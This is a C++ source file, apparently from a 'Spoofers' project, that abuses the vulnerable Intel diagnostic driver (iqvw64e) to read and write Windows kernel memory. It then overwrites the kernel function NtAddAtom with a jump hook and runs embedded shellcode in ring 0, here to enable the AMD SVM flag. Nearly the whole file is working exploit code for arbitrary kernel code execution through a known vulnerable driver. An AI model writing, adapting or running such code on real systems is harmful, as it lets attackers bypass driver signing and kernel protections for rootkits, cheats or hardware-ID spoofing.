‚}// SVMHypervisorDirect.cpp
// Direct AMD SVM hypervisor using Intel driver
// NO kdmapper - runs shellcode directly via NtAddAtom hook
// Sets CPUID hypervisor present bit

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007
#define INTEL_CASE_VIRT_TO_PHYS 0x25
#define INTEL_CASE_MAP_PHYSICAL 0x19
#define INTEL_CASE_COPY 0x33

typedef struct _INTEL_COPY_MEMORY {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} INTEL_COPY_MEMORY;

typedef struct _INTEL_VIRT_TO_PHYS {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} INTEL_VIRT_TO_PHYS;

typedef struct _INTEL_MAP_PHYS {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} INTEL_MAP_PHYS;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI NtAddAtom(PVOID, ULONG, PUSHORT);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

// ==================== Intel Driver Functions ====================

bool SafeReadKernel(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);

  INTEL_COPY_MEMORY info = {0};
  info.case_number = INTEL_CASE_COPY;
  info.source = address;
  info.destination = (uint64_t)pinnedBuffer;
  info.length = size;

  DWORD bytesReturned = 0;
  BOOL result = DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                                nullptr, 0, &bytesReturned, nullptr);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  // Get physical address
  INTEL_VIRT_TO_PHYS vtop = {0};
  vtop.case_number = INTEL_CASE_VIRT_TO_PHYS;
  vtop.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &vtop, sizeof(vtop), &vtop,
                       sizeof(vtop), &bytesReturned, nullptr)) {
    return false;
  }

  uint64_t physAddr = vtop.return_physical_address;
  if (physAddr == 0)
    return false;

  // Map physical memory
  INTEL_MAP_PHYS mapInfo = {0};
  mapInfo.case_number = INTEL_CASE_MAP_PHYSICAL;
  mapInfo.physical_address_to_map = physAddr & ~0xFFFULL;
  mapInfo.size = 0x1000;

  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &mapInfo, sizeof(mapInfo),
                       &mapInfo, sizeof(mapInfo), &bytesReturned, nullptr)) {
    return false;
  }

  if (mapInfo.return_virtual_address == 0)
    return false;

  uint64_t pageOffset = address & 0xFFF;
  uint64_t targetAddr = mapInfo.return_virtual_address + pageOffset;

  // Write via mapped address
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  INTEL_COPY_MEMORY copyInfo = {0};
  copyInfo.case_number = INTEL_CASE_COPY;
  copyInfo.source = (uint64_t)pinnedBuffer;
  copyInfo.destination = targetAddr;
  copyInfo.length = size;

  BOOL result =
      DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &copyInfo, sizeof(copyInfo),
                      nullptr, 0, &bytesReturned, nullptr);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result != FALSE;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!SafeReadKernel(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!SafeReadKernel(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                      sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;

  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    SafeReadKernel(moduleBase + exportRva + offset, exportData + offset,
                   chunkSize);
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;

  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;

    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }

  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== SVM Shellcode ====================
// This shellcode:
// 1. Checks SVMDIS bit
// 2. Enables EFER.SVME
// 3. Sets up minimal VMCB
// 4. Executes VMRUN once to set hypervisor bit
// 5. Returns to host

// Minimal shellcode that only enables EFER.SVME
// (VMRUN needs full VMCB setup which is complex for shellcode)
uint8_t svmEnableShellcode[] = {
    // Function prologue - save registers we'll use
    0x55,             // push rbp
    0x48, 0x89, 0xE5, // mov rbp, rsp
    0x53,             // push rbx
    0x51,             // push rcx
    0x52,             // push rdx

    // Check if SVM is disabled by BIOS
    0xB9, 0x14, 0x01, 0x01, 0xC0, // mov ecx, 0xC0010114 (VM_CR MSR)
    0x0F, 0x32,                   // rdmsr (result in edx:eax)
    0xA9, 0x10, 0x00, 0x00, 0x00, // test eax, 0x10 (SVMDIS bit 4)
    0x75, 0x22, // jnz error_exit (if SVMDIS=1, BIOS disabled SVM)

    // Read current EFER
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER MSR)
    0x0F, 0x32,                   // rdmsr

    // Check if SVME already enabled
    0xA9, 0x00, 0x10, 0x00, 0x00, // test eax, 0x1000 (SVME bit 12)
    0x75, 0x0E,                   // jnz already_enabled

    // Enable SVME
    0x0D, 0x00, 0x10, 0x00, 0x00, // or eax, 0x1000
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x30,                   // wrmsr

    // already_enabled:
    0x48, 0x31, 0xC0, // xor rax, rax (return 0 = SUCCESS)
    0xEB, 0x05,       // jmp cleanup

    // error_exit:
    0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00,
    0x00, // mov rax, 1 (return 1 = BIOS DISABLED)

    // cleanup:
    0x5A, // pop rdx
    0x59, // pop rcx
    0x5B, // pop rbx
    0x5D, // pop rbp
    0xC3  // ret
};

uint8_t kernel_jmp_hook[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t originalNtAddAtom[sizeof(kernel_jmp_hook)];

bool ExecuteKernelCode(uint8_t *code, size_t codeSize, NTSTATUS *result) {
  if (!kernelNtAddAtom)
    return false;

  // Read original NtAddAtom
  printf("[*] Backing up NtAddAtom...\n");
  if (!SafeReadKernel(kernelNtAddAtom, originalNtAddAtom,
                      sizeof(originalNtAddAtom))) {
    printf("[-] Failed to backup NtAddAtom!\n");
    return false;
  }
  printf("[+] Original: %02X %02X %02X %02X...\n", originalNtAddAtom[0],
         originalNtAddAtom[1], originalNtAddAtom[2], originalNtAddAtom[3]);

  // Check if already hooked
  if (originalNtAddAtom[0] == kernel_jmp_hook[0] &&
      originalNtAddAtom[1] == kernel_jmp_hook[1]) {
    printf("[-] NtAddAtom already hooked!\n");
    return false;
  }

  // Write shellcode after NtAddAtom (in same page to avoid allocation)
  uint64_t shellcodeAddr = kernelNtAddAtom + 0x80; // 128 bytes after start

  printf("[*] Writing shellcode to 0x%llX (%zu bytes)...\n", shellcodeAddr,
         codeSize);
  if (!WriteToReadOnlyMemory(shellcodeAddr, code, (uint32_t)codeSize)) {
    printf("[-] Failed to write shellcode!\n");
    return false;
  }

  // Verify shellcode was written
  uint8_t verifyBuf[8];
  SafeReadKernel(shellcodeAddr, verifyBuf, 8);
  printf("[*] Verify: %02X %02X %02X %02X...\n", verifyBuf[0], verifyBuf[1],
         verifyBuf[2], verifyBuf[3]);

  if (memcmp(verifyBuf, code, 4) != 0) {
    printf("[-] Shellcode write verification failed!\n");
    return false;
  }
  printf("[+] Shellcode written successfully!\n");

  // Create and write jump hook
  uint8_t hook[sizeof(kernel_jmp_hook)];
  memcpy(hook, kernel_jmp_hook, sizeof(hook));
  *(uint64_t *)&hook[2] = shellcodeAddr;

  printf("[*] Writing hook to NtAddAtom...\n");
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, hook, sizeof(hook))) {
    printf("[-] Failed to write hook!\n");
    return false;
  }
  printf("[+] Hook installed!\n");

  // Execute by calling NtAddAtom
  printf("[*] Executing kernel code via NtAddAtom...\n");
  USHORT atom = 0;
  NTSTATUS status = NtAddAtom(nullptr, 0, &atom);
  printf("[*] NtAddAtom returned: 0x%X\n", status);

  // Restore immediately
  printf("[*] Restoring NtAddAtom...\n");
  WriteToReadOnlyMemory(kernelNtAddAtom, originalNtAddAtom,
                        sizeof(originalNtAddAtom));
  printf("[+] Restored!\n");

  if (result)
    *result = status;
  return true;
}

// ==================== CPU Checks ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckSvmSupport() {
  int regs[4];
  __cpuid(regs, 0x80000001);
  return (regs[2] & (1 << 2)) != 0;
}

bool CheckHypervisorPresent() {
  int regs[4];
  __cpuid(regs, 1);
  return (regs[2] & (1 << 31)) != 0;
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR DIRECT (Intel Driver Only)               \n");
  printf("    Enables EFER.SVME via kernel code execution                \n");
  printf(
      "================================================================\n\n");

  printf("=== CPU Check ===\n");
  if (!CheckAmdCpu()) {
    printf("[-] Not AMD CPU!\n");
    return 1;
  }
  printf("[+] AMD CPU detected\n");

  if (!CheckSvmSupport()) {
    printf("[-] SVM not supported!\n");
    return 1;
  }
  printf("[+] SVM supported\n");
  printf("[*] Hypervisor present (before): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  printf("\n=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running! Use: sc start iqvw64e\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl.exe: 0x%llX\n", ntoskrnlBase);

  // Verify kernel readable
  IMAGE_DOS_HEADER dos;
  if (!SafeReadKernel(ntoskrnlBase, &dos, sizeof(dos)) ||
      dos.e_magic != IMAGE_DOS_SIGNATURE) {
    printf("[-] Can't read kernel memory!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] Kernel memory readable\n");

  printf("[*] Finding NtAddAtom...\n");
  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  printf(
      "\n================================================================\n");
  printf("WARNING: About to execute kernel shellcode!\n");
  printf("This will enable EFER.SVME on this processor.\n");
  printf("Press ENTER to continue or Ctrl+C to abort...\n");
  printf("================================================================\n");
  getchar();

  printf("\n=== Executing SVM Enable ===\n");
  NTSTATUS result = 0;
  if (ExecuteKernelCode(svmEnableShellcode, sizeof(svmEnableShellcode),
                        &result)) {
    printf("\n");
    if (result == 0) {
      printf("[+] SUCCESS! EFER.SVME is now ENABLED!\n");
    } else if (result == 1) {
      printf("[!] SVM is DISABLED by BIOS!\n");
      printf("    Enable SVM in BIOS settings.\n");
    } else {
      printf("[?] Unknown result: 0x%X\n", result);
    }
  } else {
    printf("\n[-] Kernel code execution failed!\n");
  }

  printf("\n=== Post-Execution ===\n");
  printf("[*] Hypervisor present (after): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  printf(
      "\n================================================================\n");
  printf("NOTE: EFER.SVME enables the ability to run VMRUN, but CPUID\n");
  printf("      bit 31 won't be set until you actually run a hypervisor.\n");
  printf("      To set CPUID bit 31, a full VMRUN loop is needed.\n");
  printf("================================================================\n");

  CloseHandle(hDevice);
  return 0;
}
‚}*cascade0822file:///C:/inject/Spoofers/SVMHypervisorDirect.cpp